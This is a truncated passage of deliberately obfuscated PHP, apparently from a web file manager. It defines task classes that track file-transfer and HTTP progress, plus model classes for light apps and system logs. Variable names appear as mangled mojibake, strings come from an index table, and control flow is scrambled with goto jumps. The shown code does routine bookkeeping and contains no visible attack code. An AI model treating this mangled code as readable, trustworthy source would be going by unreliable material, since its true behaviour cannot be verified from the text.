$_SERVER[¼€¼ˆ¦‚¡]; Cache::set($béé¾ôœÀ’[1454] . $this->task[$béé¾ôœÀ’[367]], $Aø¾êéáô†, 60); return $Aø¾êéáô†; } public static function get($EÜåñİ Ä) { return self::valueGet($EÜåñİ Ä); } public static function listData() { $C›«İºò¥ = self::valueGet(); return array_sort_by($C›«İºò¥, $_SERVER[¼€¼ˆ¦‚¡][1440], !0); } public static function kill($d¸Ù„äë‡í) { return self::changeStatus($d¸Ù„äë‡í, self::STATYS_KILL); } public static function stop($aæ¢ËªÚŠ) { return self::changeStatus($aæ¢ËªÚŠ, self::STATYS_STOP); } public static function restart($E÷¥‹„È) { return self::changeStatus($E÷¥‹„È, self::STATYS_RUNNING); } public static function killAll() { $B²Ã öó– =& $_SERVER[¼€¼ˆ¦‚¡]; $eÜ¡§èƒò• = self::listData(); foreach ($eÜ¡§èƒò• as $Bò¸ƒÜ¤©¿) { self::kill($Bò¸ƒÜ¤©¿[$B²Ã öó–[367]]); } sleep(2); foreach ($eÜ¡§èƒò• as $Bò¸ƒÜ¤©¿) { self::valueSet($Bò¸ƒÜ¤©¿[$B²Ã öó–[367]], !1); } } private static function changeStatus($F¢Ôà¯øŒ, $Bè¤´“Îíß) { goto a‹»ºù×§à; a‹»ºù×§à: $cñœ‚ƒ¨æ =& $_SERVER[¼€¼ˆ¦‚¡]; $e±Â‡¬ˆÖ = self::valueGet($F¢Ôà¯øŒ); if (!$e±Â‡¬ˆÖ) { return !1; } goto a§«Ê–©È÷; D­çòôñµÕ: return !0; goto A‰ÆÆ»ñáŸ; a§«Ê–©È÷: $e±Â‡¬ˆÖ[$cñœ‚ƒ¨æ[685]] = $Bè¤´“Îíß; self::valueSet($F¢Ôà¯øŒ, $e±Â‡¬ˆÖ); self::log($cñœ‚ƒ¨æ[1456] . $e±Â‡¬ˆÖ[$cñœ‚ƒ¨æ[367]] . $cñœ‚ƒ¨æ[1457] . $Bè¤´“Îíß); goto D­çòôñµÕ; A‰ÆÆ»ñáŸ: } public static function valueGet($D¬ÍŞ³¸ë = false) { $DÒğßã‘ïñ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($D¬ÍŞ³¸ë) { $c¨ƒ·Î¤“ˆ = Model($DÒğßã‘ïñ[399])->where(array($DÒğßã‘ïñ[89] => $D¬ÍŞ³¸ë, $DÒğßã‘ïñ[29] => $DÒğßã‘ïñ[1458]))->find(); return $c¨ƒ·Î¤“ˆ ? json_decode($c¨ƒ·Î¤“ˆ[$DÒğßã‘ïñ[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($FÖ–ÅÙ»‹ß = false) { goto D³î¤ÏÅé; EÑÛÛÀÁÀ: return $Cçàªò‚Ğ„; goto E§áÖİÁñæ; fì¥®ã¡—®: $Cçàªò‚Ğ„ = Model($b·©œ“¦Ô¦[399])->where($fÄÛ‹ÅŞ®†)->select(); $Cçàªò‚Ğ„ = $Cçàªò‚Ğ„ ? $Cçàªò‚Ğ„ : array(); foreach ($Cçàªò‚Ğ„ as $d¸¦ğĞé => $BÌÃ™»…‹) { $Cçàªò‚Ğ„[$d¸¦ğĞé] = json_decode($BÌÃ™»…‹[$b·©œ“¦Ô¦[359]], !0); } goto EÑÛÛÀÁÀ; D³î¤ÏÅé: $b·©œ“¦Ô¦ =& $_SERVER[¼€¼ˆ¦‚¡]; $fÄÛ‹ÅŞ®† = array($b·©œ“¦Ô¦[29] => $b·©œ“¦Ô¦[1458]); if ($FÖ–ÅÙ»‹ß) { $fÄÛ‹ÅŞ®†[$b·©œ“¦Ô¦[1437]] = $FÖ–ÅÙ»‹ß; } goto fì¥®ã¡—®; E§áÖİÁñæ: } public static function valueSet($F‡ŸÔ†è–†, $F„©Ø×ğğ) { goto eÅİ‹…Ë¶; eÅİ‹…Ë¶: $eƒñÂÊ„Ó =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$F„©Ø×ğğ) { return Model($eƒñÂÊ„Ó[399])->where(array($eƒñÂÊ„Ó[89] => $F‡ŸÔ†è–†, $eƒñÂÊ„Ó[29] => $eƒñÂÊ„Ó[1458]))->delete(); } $CÒÁ¹è‹¿ƒ = json_encode($F„©Ø×ğğ); goto BÜÃË·‹; BÜÃË·‹: if (!$CÒÁ¹è‹¿ƒ) { ob_start(); var_dump($F„©Ø×ğğ); $A‡óÀÍ“ = ob_get_clean(); self::log($eƒñÂÊ„Ó[1459] . json_encode_force($A‡óÀÍ“)); } if (!$F‡ŸÔ†è–† || !$F„©Ø×ğğ[$eƒñÂÊ„Ó[367]]) { return !1; } $cÄŠ›å²š = array($eƒñÂÊ„Ó[29] => $eƒñÂÊ„Ó[1458], $eƒñÂÊ„Ó[1437] => USER_ID, $eƒñÂÊ„Ó[89] => $F‡ŸÔ†è–†, $eƒñÂÊ„Ó[359] => $CÒÁ¹è‹¿ƒ); goto F®¡ºÛÀ; F®¡ºÛÀ: Model($eƒñÂÊ„Ó[399])->add($cÄŠ›å²š, array(), !0); goto C„Š˜›±; C„Š˜›±: } public static function log($FâÏÃÕ¬í—) { write_log($FâÏÃÕ¬í—, $_SERVER[¼€¼ˆ¦‚¡][1460]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto EìÌŠ™í™œ; aá¯ ÒÎ©»: Hook::bind($Bö÷ÌçÁÇ[539], array($this, $Bö÷ÌçÁÇ[1467])); Hook::bind($Bö÷ÌçÁÇ[540], array($this, $Bö÷ÌçÁÇ[1468])); Hook::bind($Bö÷ÌçÁÇ[542], array($this, $Bö÷ÌçÁÇ[1469])); goto f’åº˜ÜÂ¾; DÆ‡ÕğÂ£: Hook::bind($Bö÷ÌçÁÇ[1471], array($this, $Bö÷ÌçÁÇ[1472])); Hook::bind($Bö÷ÌçÁÇ[532], array($this, $Bö÷ÌçÁÇ[1473])); $this->sourceModelCopyFlag = !1; goto Bó¶Š¶ì«Ê; D÷¯†µÄÌÔ: Hook::bind($Bö÷ÌçÁÇ[1461], array($this, $Bö÷ÌçÁÇ[1462])); Hook::bind($Bö÷ÌçÁÇ[1463], array($this, $Bö÷ÌçÁÇ[1464])); Hook::bind($Bö÷ÌçÁÇ[1465], array($this, $Bö÷ÌçÁÇ[1466])); goto aá¯ ÒÎ©»; B×ìµ¾¥ù: $A­äöçîÃã[$Bö÷ÌçÁÇ[1486]] = 0; $A­äöçîÃã[$Bö÷ÌçÁÇ[1487]] = 0; if (!$A­äöçîÃã[$Bö÷ÌçÁÇ[1342]]) { $A­äöçîÃã[$Bö÷ÌçÁÇ[1342]] = LNG($Bö÷ÌçÁÇ[1488]); } goto aø“ãÊçí; Bó¶Š¶ì«Ê: Hook::bind($Bö÷ÌçÁÇ[1474], array($this, $Bö÷ÌçÁÇ[1475])); Hook::bind($Bö÷ÌçÁÇ[1476], array($this, $Bö÷ÌçÁÇ[1477])); Hook::bind($Bö÷ÌçÁÇ[1478], array($this, $Bö÷ÌçÁÇ[1479])); goto CÚƒ‚ÁùË£; câÃá¥: Hook::bind($Bö÷ÌçÁÇ[511], array($this, $Bö÷ÌçÁÇ[1470])); Hook::bind($Bö÷ÌçÁÇ[513], array($this, $Bö÷ÌçÁÇ[1470])); Hook::bind($Bö÷ÌçÁÇ[515], array($this, $Bö÷ÌçÁÇ[1470])); goto DÆ‡ÕğÂ£; CÚƒ‚ÁùË£: $A­äöçîÃã[$Bö÷ÌçÁÇ[1480]] = LNG($Bö÷ÌçÁÇ[1481]); $A­äöçîÃã[$Bö÷ÌçÁÇ[1482]] = 0; $A­äöçîÃã[$Bö÷ÌçÁÇ[1483]] = 0; goto DÓ¢ì¡°•; EìÌŠ™í™œ: $Bö÷ÌçÁÇ =& $_SERVER[¼€¼ˆ¦‚¡]; $A­äöçîÃã =& $this->task; $this->sourceCopyFolder = !1; goto D÷¯†µÄÌÔ; DÓ¢ì¡°•: $A­äöçîÃã[$Bö÷ÌçÁÇ[977]] = $Bö÷ÌçÁÇ[33]; $A­äöçîÃã[$Bö÷ÌçÁÇ[1484]] = $Bö÷ÌçÁÇ[33]; $A­äöçîÃã[$Bö÷ÌçÁÇ[1485]] = 0; goto B×ìµ¾¥ù; f’åº˜ÜÂ¾: Hook::bind($Bö÷ÌçÁÇ[543], array($this, $Bö÷ÌçÁÇ[1469])); Hook::bind($Bö÷ÌçÁÇ[509], array($this, $Bö÷ÌçÁÇ[1470])); Hook::bind($Bö÷ÌçÁÇ[506], array($this, $Bö÷ÌçÁÇ[1470])); goto câÃá¥; aø“ãÊçí: } protected function endAfter() { goto BÄ‰˜áË»; Eç–Ø’Š§: Hook::unbind($b‡§ß¸ë‡ì[515], array($this, $b‡§ß¸ë‡ì[1470])); Hook::unbind($b‡§ß¸ë‡ì[1471], array($this, $b‡§ß¸ë‡ì[1472])); Hook::unbind($b‡§ß¸ë‡ì[532], array($this, $b‡§ß¸ë‡ì[1473])); goto bÓÂ„¸£õ™; Bñ£‘í•÷‰: Hook::unbind($b‡§ß¸ë‡ì[506], array($this, $b‡§ß¸ë‡ì[1470])); Hook::unbind($b‡§ß¸ë‡ì[511], array($this, $b‡§ß¸ë‡ì[1470])); Hook::unbind($b‡§ß¸ë‡ì[513], array($this, $b‡§ß¸ë‡ì[1470])); goto Eç–Ø’Š§; BÄ‰˜áË»: $b‡§ß¸ë‡ì =& $_SERVER[¼€¼ˆ¦‚¡]; Hook::unbind($b‡§ß¸ë‡ì[1461], array($this, $b‡§ß¸ë‡ì[1462])); Hook::unbind($b‡§ß¸ë‡ì[1463], array($this, $b‡§ß¸ë‡ì[1464])); goto E÷†È¨±òƒ; bÓÂ„¸£õ™: Hook::unbind($b‡§ß¸ë‡ì[1474], array($this, $b‡§ß¸ë‡ì[1475])); Hook::unbind($b‡§ß¸ë‡ì[1476], array($this, $b‡§ß¸ë‡ì[1477])); Hook::unbind($b‡§ß¸ë‡ì[1478], array($this, $b‡§ß¸ë‡ì[1479])); goto CÑÔš˜˜Øœ; E÷†È¨±òƒ: Hook::unbind($b‡§ß¸ë‡ì[1465], array($this, $b‡§ß¸ë‡ì[1466])); Hook::unbind($b‡§ß¸ë‡ì[539], array($this, $b‡§ß¸ë‡ì[1467])); Hook::unbind($b‡§ß¸ë‡ì[540], array($this, $b‡§ß¸ë‡ì[1468])); goto eëõéÛ–¸²; eëõéÛ–¸²: Hook::unbind($b‡§ß¸ë‡ì[542], array($this, $b‡§ß¸ë‡ì[1469])); Hook::unbind($b‡§ß¸ë‡ì[543], array($this, $b‡§ß¸ë‡ì[1469])); Hook::unbind($b‡§ß¸ë‡ì[509], array($this, $b‡§ß¸ë‡ì[1470])); goto Bñ£‘í•÷‰; CÑÔš˜˜Øœ: } public function copyMoveStart($Bç‰ƒå¾ÕĞ, $a¼¶Š©îÓõ, $c³ï¿½˜Ë, $C½áêíÁé¨) { goto cÓÌÏËÃ‚; cÓÌÏËÃ‚: $d‚‘ÏÜ½²¾ =& $_SERVER[¼€¼ˆ¦‚¡]; self::log($d‚‘ÏÜ½²¾[1489] . $a¼¶Š©îÓõ . $d‚‘ÏÜ½²¾[66] . $C½áêíÁé¨); $eÀ©¦ñ† = rtrim(TEMP_FILES, $d‚‘ÏÜ½²¾[8]); goto Fƒ½èÌ‡æğ; Fƒ½èÌ‡æğ: if (substr($a¼¶Š©îÓõ, 0, strlen($eÀ©¦ñ†)) == $eÀ©¦ñ†) { return; } if (substr($C½áêíÁé¨, 0, strlen($eÀ©¦ñ†)) == $eÀ©¦ñ†) { return; } $CŠÉ…Š°ã¾ =& $this->task; goto DíÖ°²°í÷; DíÖ°²°í÷: $CŠÉ…Š°ã¾[$d‚‘ÏÜ½²¾[1490]] = KodIO::transferType($Bç‰ƒå¾ÕĞ, $c³ï¿½˜Ë); $this->update(); goto Bë‡ãì¨ò; Bë‡ãì¨ò: } public function updateAfter() { goto dà‹ÜÓÒ¯; CÍàÈ‚ìã¨: if ($this->sourceModelCopyFlag) { return; } if ($E†µáì½[$cÃÈé–Ò°[1490]] == $cÃÈé–Ò°[1094]) { return; } if ($E†µáì½[$cÃÈé–Ò°[1490]] == $cÃÈé–Ò°[1039] || $E†µáì½[$cÃÈé–Ò°[1490]] == $cÃÈé–Ò°[103]) { if ($E†µáì½[$cÃÈé–Ò°[1484]]) { $E†µáì½[$cÃÈé–Ò°[1487]] = $E†µáì½[$cÃÈé–Ò°[1486]] + $E†µáì½[$cÃÈé–Ò°[1483]]; } } else { if ($E†µáì½[$cÃÈé–Ò°[1490]] == $cÃÈé–Ò°[1095]) { if ($E†µáì½[$cÃÈé–Ò°[1484]] == $cÃÈé–Ò°[1039]) { $E†µáì½[$cÃÈé–Ò°[1487]] = $E†µáì½[$cÃÈé–Ò°[1486]] + $E†µáì½[$cÃÈé–Ò°[1483]] * 0.5; } else { if ($E†µáì½[$cÃÈé–Ò°[1484]] == $cÃÈé–Ò°[103]) { $E†µáì½[$cÃÈé–Ò°[1487]] = $E†µáì½[$cÃÈé–Ò°[1486]] + $E†µáì½[$cÃÈé–Ò°[1482]] * 0.5 + $E†µáì½[$cÃÈé–Ò°[1483]] * 0.5; } } } } goto EÔàÈ®™í–; EÔàÈ®™í–: $E†µáì½[$cÃÈé–Ò°[1438]] = $E†µáì½[$cÃÈé–Ò°[1487]] / $E†µáì½[$cÃÈé–Ò°[694]]; if ($E†µáì½[$cÃÈé–Ò°[1438]] > 0) { $aÙïğ‹†˜ = timeFloat() - $E†µáì½[$cÃÈé–Ò°[1440]] - $E†µáì½[$cÃÈé–Ò°[1443]]; $E†µáì½[$cÃÈé–Ò°[1444]] = $aÙïğ‹†˜ * (1 - $E†µáì½[$cÃÈé–Ò°[1438]]) / $E†µáì½[$cÃÈé–Ò°[1438]]; } goto EÊ¾Èù×è«; dà‹ÜÓÒ¯: $cÃÈé–Ò° =& $_SERVER[¼€¼ˆ¦‚¡]; $E†µáì½ =& $this->task; if (!$E†µáì½[$cÃÈé–Ò°[694]]) { return; } goto CÍàÈ‚ìã¨; EÊ¾Èù×è«: } public function addPath($bºÏÖµÉï) { goto AÅ·ô×ñÎÔ; FİŒ¦éÓàÕ: $e‚«¹ŒƒÒÔ = IO::infoWithChildren($bºÏÖµÉï); $cšæÌ‹‘«š = $CÜÖÔãÅšÔ[$F¢¥Ø¬Ëëª[1491]] ? $CÜÖÔãÅšÔ[$F¢¥Ø¬Ëëª[1491]][$F¢¥Ø¬Ëëª[1492]] : 0; $CÜÖÔãÅšÔ[$F¢¥Ø¬Ëëª[1491]] = array($F¢¥Ø¬Ëëª[1492] => $cšæÌ‹‘«š + 1, $F¢¥Ø¬Ëëª[386] => $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[28]], $F¢¥Ø¬Ëëª[75] => $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[75]], $F¢¥Ø¬Ëëª[466] => $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[466]] ? $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[466]] : $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[75]]); goto BÀµ¾š…Šš; BÀµ¾š…Šš: if ($e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[29]] == $F¢¥Ø¬Ëëª[167]) { $CÜÖÔãÅšÔ[$F¢¥Ø¬Ëëª[975]] += 1; } else { $CÜÖÔãÅšÔ[$F¢¥Ø¬Ëëª[975]] += $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[80]][$F¢¥Ø¬Ëëª[78]]; if ($e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[369]]) { $CÜÖÔãÅšÔ[$F¢¥Ø¬Ëëª[975]] += $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[80]][$F¢¥Ø¬Ëëª[79]] + 1; } } $CÜÖÔãÅšÔ[$F¢¥Ø¬Ëëª[694]] += $e‚«¹ŒƒÒÔ[$F¢¥Ø¬Ëëª[77]]; $this->update(); goto eîÕ¤ŸŠôÆ; AÅ·ô×ñÎÔ: $F¢¥Ø¬Ëëª =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$bºÏÖµÉï) { return; } $CÜÖÔãÅšÔ =& $this->task; goto FİŒ¦éÓàÕ; eîÕ¤ŸŠôÆ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($b²Ù‘ô«¯¹) { $dß§¯Œ´ƒÊ =& $_SERVER[¼€¼ˆ¦‚¡]; $fÅê˜ª˜¢ =& $this->task; $fÅê˜ª˜¢[$dß§¯Œ´ƒÊ[1480]] = $b²Ù‘ô«¯¹[$dß§¯Œ´ƒÊ[28]]; $fÅê˜ª˜¢[$dß§¯Œ´ƒÊ[977]] = $b²Ù‘ô«¯¹[$dß§¯Œ´ƒÊ[28]]; $this->update(); } public function copyFileStart($B‡‰ˆ“Ä›, $bôÇ¶É¸à, $aôïšë¼Ï½, $cÅ²Ú´±‘, $C÷àñì¯óÕ, $dîõÖğ…ˆ) { goto d‘””¾¿—£; DÖŒ¾õ›ò: $cíÚ¶§ª¬ì[$Fñ°¡øÑãÁ[977]] = $Fñ°¡øÑãÁ[33]; $cíÚ¶§ª¬ì[$Fñ°¡øÑãÁ[1484]] = $Fñ°¡øÑãÁ[33]; $cíÚ¶§ª¬ì[$Fñ°¡øÑãÁ[1485]] = 0; goto eäŒ¾¬¶ƒ’; d‘””¾¿—£: $Fñ°¡øÑãÁ =& $_SERVER[¼€¼ˆ¦‚¡]; $fĞ»ï§®‡œ = $C÷àñì¯óÕ; if ($fĞ»ï§®‡œ == $GLOBALS[$Fñ°¡øÑãÁ[1493]]) { $fĞ»ï§®‡œ = $GLOBALS[$Fñ°¡øÑãÁ[1494]]; } goto C†ÑÏåÅÏ; BÑ®Õ„Å: $cíÚ¶§ª¬ì[$Fñ°¡øÑãÁ[1480]] = $fĞ»ï§®‡œ; $cíÚ¶§ª¬ì[$Fñ°¡øÑãÁ[1482]] = (int) $B‡‰ˆ“Ä›->size($bôÇ¶É¸à); $cíÚ¶§ª¬ì[$Fñ°¡øÑãÁ[1483]] = 0; goto DÖŒ¾õ›ò; eäŒ¾¬¶ƒ’: $this->update(); goto D¥‰–÷°ÎÁ; C†ÑÏåÅÏ: $GLOBALS[$Fñ°¡øÑãÁ[1494]] = $C÷àñì¯óÕ; $GLOBALS[$Fñ°¡øÑãÁ[1493]] = $dîõÖğ…ˆ; $cíÚ¶§ª¬ì =& $this->task; goto BÑ®Õ„Å; D¥‰–÷°ÎÁ: } public function copyFileEnd($B»ÑÊôñë², $bÛãÌÃöÚÈ, $aäê÷„¶Ø, $A£©¯‡ë«´, $dìáŞƒÊİ¥, $BÍ™¥õè) { $d¼¡°ÉÆ×¼ =& $_SERVER[¼€¼ˆ¦‚¡]; $açƒªÏî›Û =& $this->task; $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1483]] = $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1482]]; $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1484]] = $d¼¡°ÉÆ×¼[33]; if ($dìáŞƒÊİ¥ == $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1480]]) { $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1486]] += $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1482]]; $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1487]] = $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1486]]; $this->update(1); } else { $this->update(); $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1483]] = 0; } self::log($d¼¡°ÉÆ×¼[1495] . $bÛãÌÃöÚÈ . $d¼¡°ÉÆ×¼[66] . $A£©¯‡ë«´ . $d¼¡°ÉÆ×¼[217] . $dìáŞƒÊİ¥ . $d¼¡°ÉÆ×¼[1496] . $açƒªÏî›Û[$d¼¡°ÉÆ×¼[1480]]); } public function updateFileEnd($CÑƒ™™öÏ, $CØµ÷½) { goto F££“¢Î™‹; F££“¢Î™‹: $bê…©¼²Ç =& $_SERVER[¼€¼ˆ¦‚¡]; $e¦†×Ë½º =& $this->task; $e¦†×Ë½º[$bê…©¼²Ç[1480]] = $CÑƒ™™öÏ; goto cÂ±±åï¤ì; fˆªÍÎ‡â“: $this->update(1); self::log($bê…©¼²Ç[1497] . $CÑƒ™™öÏ); goto aƒÆÑÈ«À¶; cÂ±±åï¤ì: $e¦†×Ë½º[$bê…©¼²Ç[1482]] = $CØµ÷½; $e¦†×Ë½º[$bê…©¼²Ç[1486]] += $CØµ÷½; $e¦†×Ë½º[$bê…©¼²Ç[1487]] = $e¦†×Ë½º[$bê…©¼²Ç[1486]]; goto fˆªÍÎ‡â“; aƒÆÑÈ«À¶: } public function sourceModelCopy($bÉšìŒˆÉÀ) { goto BàÖ˜°‘Š×; eÁàÍ™‰ÔÓ: $EøØÅ¶àÕ‹ =& $this->task; $this->sourceModelCopyFlag = !0; $D‚È ‹ë¦ = 0; goto e¸ßÔ†ĞÓ; BàÖ˜°‘Š×: $d™İŠñö£ˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $A˜š¥¨ = $bÉšìŒˆÉÀ[0]; $AµÒ×ÒĞ¹ = $bÉšìŒˆÉÀ[1]; goto eÁàÍ™‰ÔÓ; e¸ßÔ†ĞÓ: switch ($A˜š¥¨) { case $d™İŠñö£ˆ[507]: $D‚È ‹ë¦ = 1; break; case $d™İŠñö£ˆ[510]: $EøØÅ¶àÕ‹[$d™İŠñö£ˆ[1480]] = $AµÒ×ÒĞ¹[$d™İŠñö£ˆ[28]]; break; case $d™İŠñö£ˆ[512]: $D‚È ‹ë¦ = intval($bÉšìŒˆÉÀ[$d™İŠñö£ˆ[363]] * 0.4); break; case $d™İŠñö£ˆ[514]: $D‚È ‹ë¦ = intval($bÉšìŒˆÉÀ[$d™İŠñö£ˆ[363]] * 0.2); break; case $d™İŠñö£ˆ[516]: $D‚È ‹ë¦ = intval($bÉšìŒˆÉÀ[$d™İŠñö£ˆ[363]] * 0.4); break; } $this->update($D‚È ‹ë¦); $this->sourceModelCopyFlag = !1; goto AÑ·²‡ôµñ; AÑ·²‡ôµñ: } public function sourceRemove($F”ÄíÌóÇô, $BöÃÍÁ”‚¹) { $FÉÏ¡À´— =& $_SERVER[¼€¼ˆ¦‚¡]; $this->sourceModelCopyFlag = !0; $f×ŠÄëÔ = 1; if (isset($F”ÄíÌóÇô[$FÉÏ¡À´—[80]])) { $f×ŠÄëÔ = $F”ÄíÌóÇô[$FÉÏ¡À´—[80]][$FÉÏ¡À´—[78]] + $F”ÄíÌóÇô[$FÉÏ¡À´—[80]][$FÉÏ¡À´—[79]] + 1; } $this->update($f×ŠÄëÔ); $this->sourceModelCopyFlag = !1; } public function sourceMove($aÅè¿·æö) { $this->sourceRemove($aÅè¿·æö, !1); } public function curlProgress($FÎíÄÓÕèê, $fù—ãÚßïÒ, $a‰¾øœ, $AÅİ ø¾¤, $a¦…¤Œõœ) { $dã©£ö‡‚¹ =& $_SERVER[¼€¼ˆ¦‚¡]; $fŞ“ñ¡õ‘¥ =& $this->task; if ($a¦…¤Œõœ > 0) { $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[977]] = $dã©£ö‡‚¹[1498]; $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1484]] = $dã©£ö‡‚¹[103]; if ($fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1482]] == $AÅİ ø¾¤ || $AÅİ ø¾¤ > 1024 * 1024) { $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1483]] = $a¦…¤Œõœ; } if ($fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1485]]) { $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1483]] = $a¦…¤Œõœ + $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1485]]; } } else { if ($a‰¾øœ > 0) { if ($fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1482]] == $fù—ãÚßïÒ) { $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1483]] = $a‰¾øœ; $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[977]] = $dã©£ö‡‚¹[1499]; $fŞ“ñ¡õ‘¥[$dã©£ö‡‚¹[1484]] = $dã©£ö‡‚¹[1039]; } } } $this->update(); } public function curlProgressStart($eøäêÍÔ½ï) { } public function curlProgressEnd($Aô¤ùƒ³†’) { $fÈÕ›º Ûã =& $_SERVER[¼€¼ˆ¦‚¡]; $DÕ¶È‚©ã“ =& $this->task; $c–›ëêöé = curl_getinfo($Aô¤ùƒ³†’); $F¬‰ÊíëÛ¥ = $c–›ëêöé[$fÈÕ›º Ûã[1500]]; if ($DÕ¶È‚©ã“[$fÈÕ›º Ûã[1484]] == $fÈÕ›º Ûã[103] && $F¬‰ÊíëÛ¥) { $DÕ¶È‚©ã“[$fÈÕ›º Ûã[1485]] += $F¬‰ÊíëÛ¥; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $fº”ñáÛ° =& $_SERVER[¼€¼ˆ¦‚¡]; $aÛ×íë½… =& $this->task; $aÛ×íë½…[$fº”ñáÛ°[1501]] = 1; Hook::bind($fº”ñáÛ°[1474], array($this, $fº”ñáÛ°[1502])); Hook::bind($fº”ñáÛ°[1476], array($this, $fº”ñáÛ°[1503])); Hook::bind($fº”ñáÛ°[1478], array($this, $fº”ñáÛ°[1504])); } protected function endAfter() { $e»¬ì•’å =& $_SERVER[¼€¼ˆ¦‚¡]; Hook::unbind($e»¬ì•’å[1474], array($this, $e»¬ì•’å[1502])); Hook::unbind($e»¬ì•’å[1476], array($this, $e»¬ì•’å[1503])); Hook::unbind($e»¬ì•’å[1478], array($this, $e»¬ì•’å[1504])); } public function progressStart($a©áãÙÈ) { $Cªù´ã¹ =& $_SERVER[¼€¼ˆ¦‚¡]; $F›ä´µÈÒ„ = curl_getinfo($a©áãÙÈ); self::log($Cªù´ã¹[1505] . $F›ä´µÈÒ„[$Cªù´ã¹[295]]); self::valueSet($this->task[$Cªù´ã¹[367]], $this->task); } public function progressEnd($EéĞéˆµËÒ) { $e¥Å¿Ã”ùˆ =& $_SERVER[¼€¼ˆ¦‚¡]; self::log($e¥Å¿Ã”ùˆ[1506] . $this->task[$e¥Å¿Ã”ùˆ[367]]); $this->end(); } public function progress($Dî½œ™‹Š, $a££Ğ¹×Á, $c„šÇÑÁ´°, $Aİ¬±¾»©, $Eóºº„ÎâÛ) { $f¦ñØŒ†¡İ =& $_SERVER[¼€¼ˆ¦‚¡]; $bæ·ÃŸâÁÌ =& $this->task; if ($Eóºº„ÎâÛ > 0) { $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[975]] = $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[975]] == 0 ? $Aİ¬±¾»© : $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[975]]; $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[989]] = $Eóºº„ÎâÛ; } else { if ($c„šÇÑÁ´° > 0) { $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[975]] = $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[975]] == 0 ? $a££Ğ¹×Á : $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[975]]; $bæ·ÃŸâÁÌ[$f¦ñØŒ†¡İ[989]] = $c„šÇÑÁ´°; } } $this->update(); self::log("\x70\162\157\147\162\145\163\x73\110\164\164\160\x3a\144\157\x77\x6e\72{$c„šÇÑÁ´°}\x2f{$a££Ğ¹×Á}\73\40\x75\160\154\157\141\144\72{$Eóºº„ÎâÛ}\x2f{$Aİ¬±¾»©}\73"); } } goto eˆç‚ùù‘“; e¬Â´†øÓ¡: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x4c\x69\147\x68\x74\101\160\x70"; public $modelType = "\123\x79\163\x74\145\155\117\x70\164\x69\157\156"; public $field = array("\x6e\141\155\x65", "\147\x72\157\165\x70", "\x64\x65\x73\x63", "\143\x6f\156\x74\145\156\x74"); public function listData($D–¡—ğìé = false, $D¤©ñØ´ÀÕ = "\155\x6f\144\x69\146\x79\x54\x69\155\145", $fŠ£õ¡Ï±ˆ = true) { return parent::listData($D–¡—ğìé, $D¤©ñØ´ÀÕ, $fŠ£õ¡Ï±ˆ); } public function remove($bŒ ‘»öÛŒ) { $A—Í»æƒ—ƒ = $this->findByName($bŒ ‘»öÛŒ); if (!$A—Í»æƒ—ƒ) { return !1; } return parent::remove($A—Í»æƒ—ƒ[$_SERVER[¼€¼ˆ¦‚¡][367]]); } public function add($Eµ¯…•äØÔ) { if ($this->findByName($Eµ¯…•äØÔ[$_SERVER[¼€¼ˆ¦‚¡][28]])) { return !1; } return parent::insert($Eµ¯…•äØÔ); } public function update($a¤Û»’ë‰, $C»ãõÀÕÑ­) { $A¿Œ®†ŠÔ› =& $_SERVER[¼€¼ˆ¦‚¡]; $bÈ¢¤ˆ×ë = $this->findByName($a¤Û»’ë‰); $aŞ¦Ñ¥×Ü = $this->findByName($C»ãõÀÕÑ­[$A¿Œ®†ŠÔ›[28]]); if (!$bÈ¢¤ˆ×ë || $aŞ¦Ñ¥×Ü && $aŞ¦Ñ¥×Ü[$A¿Œ®†ŠÔ›[367]] != $bÈ¢¤ˆ×ë[$A¿Œ®†ŠÔ›[367]]) { return !1; } return parent::update($bÈ¢¤ˆ×ë[$A¿Œ®†ŠÔ›[367]], $C»ãõÀÕÑ­); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\x69\155\x65", "\164\x69\155\145", 